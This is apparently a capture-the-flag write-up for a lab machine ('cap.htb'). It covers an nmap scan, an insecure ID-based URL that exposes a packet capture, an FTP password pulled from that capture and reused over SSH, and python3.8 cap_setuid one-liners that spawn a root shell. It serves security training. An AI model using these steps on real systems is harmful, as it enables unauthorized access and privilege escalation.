### Nmap
```
nmap -sV -sC -vv 10.129.19.234

---OUTPUT---
Nmap scan report for 10.129.19.234
Host is up, received echo-reply ttl 63 (0.017s latency).
Scanned at 2026-06-10 05:28:25 EDT for 11s
Not shown: 997 closed tcp ports (reset)
PORT   STATE SERVICE REASON         VERSION
21/tcp open  ftp     syn-ack ttl 63 vsftpd 3.0.3
22/tcp open  ssh     syn-ack ttl 63 OpenSSH 8.2p1 Ubuntu 4ubuntu0.2 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 fa:80:a9:b2:ca:3b:88:69:a4:28:9e:39:0d:27:d5:75 (RSA)
| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQC2vrva1a+HtV5SnbxxtZSs+D8/EXPL2wiqOUG2ngq9zaPlF6cuLX3P2QYvGfh5bcAIVjIqNUmmc1eSHVxtbmNEQjyJdjZOP4i2IfX/RZUA18dWTfEWlNaoVDGBsc8zunvFk3nkyaynnXmlH7n3BLb1nRNyxtouW+q7VzhA6YK3ziOD6tXT7MMnDU7CfG1PfMqdU297OVP35BODg1gZawthjxMi5i5R1g3nyODudFoWaHu9GZ3D/dSQbMAxsly98L1Wr6YJ6M6xfqDurgOAl9i6TZ4zx93c/h1MO+mKH7EobPR/ZWrFGLeVFZbB6jYEflCty8W8Dwr7HOdF1gULr+Mj+BcykLlzPoEhD7YqjRBm8SHdicPP1huq+/3tN7Q/IOf68NNJDdeq6QuGKh1CKqloT/+QZzZcJRubxULUg8YLGsYUHd1umySv4cHHEXRl7vcZJst78eBqnYUtN3MweQr4ga1kQP4YZK5qUQCTPPmrKMa9NPh1sjHSdS8IwiH12V0=
|   256 96:d8:f8:e3:e8:f7:71:36:c5:49:d5:9d:b6:a4:c9:0c (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBDqG/RCH23t5Pr9sw6dCqvySMHEjxwCfMzBDypoNIMIa8iKYAe84s/X7vDbA9T/vtGDYzS+fw8I5MAGpX8deeKI=
|   256 3f:d0:ff:91:eb:3b:f6:e1:9f:2e:8d:de:b3:de:b2:18 (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIPbLTiQl+6W0EOi8vS+sByUiZdBsuz0v/7zITtSuaTFH
80/tcp open  http    syn-ack ttl 63 Gunicorn
|_http-server-header: gunicorn
| http-methods: 
|_  Supported Methods: HEAD OPTIONS GET
|_http-title: Security Dashboard
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel
```

### Port 80
![[Pasted image 20260610053221.png]]

- Under the `Security Snapshots` section we see the url captures some packets and sets the url like `http://cap.htb/data/1` where `1` is the id number.
![[Pasted image 20260610061215.png]]
- Usually there are no packets but if we select id `0` we see one with packets.
![[Pasted image 20260610061235.png]]

- I download it and open it via Wireshark and see that there is some ftp traffic with the password for user `nathan`: `Buck3tH4TF0RM3!`
![[Pasted image 20260610061356.png]]

- Using ssh I can login to the target with these credentials:
```
ssh nathan@cap.htb

> yes
> Buck3tH4TF0RM3!
```
![[Pasted image 20260610061446.png]]

- I grab the user flag:
![[Pasted image 20260610061506.png]]

### Privilege Escalation
- Running linpeas I see this user has some capabilities on python3.8:
```
/usr/bin/python3.8 = cap_setuid,cap_net_bind_service+eip
```
![[Pasted image 20260610062825.png]]

- Checking gtfobins shows cabalities exploit. We can pass either of these two:
```
python -c 'import os; os.setuid(0); os.execl("/bin/sh", "sh")'

--OR--
/usr/bin/python3.8 -c 'import os; os.setuid(0); os.system("/bin/bash")'

```
![[Pasted image 20260610074410.png]]

- I switch to a root shell:
![[Pasted image 20260610074442.png]]

- I grab the root flag:
![[Pasted image 20260610074521.png]]